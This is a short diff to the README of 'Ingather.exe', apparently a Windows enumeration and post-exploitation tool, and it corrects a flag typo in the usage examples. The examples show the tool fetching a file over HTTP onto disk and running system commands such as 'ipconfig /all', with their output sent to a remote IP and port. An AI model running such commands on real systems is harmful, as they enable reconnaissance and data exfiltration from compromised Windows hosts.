@@ -4,7 +4,7 @@ Windows vulnerability command line enumeration tool.  Written in Free Pascal/Laz
 
 ```
 Usage: Ingather.exe --enum -i 1.1.1.1 -p 4444 -o output.txt
-       Ingather.exe --d http://www.abcded.com/abc.txt -s c:\temp\abc.text
+       Ingather.exe -d http://www.abcded.com/abc.txt -s c:\temp\abc.text
        Ingather.exe -c "ipconfig /all" -i 1.1.1.1 -p 4444
 
 Download file over HTTP:
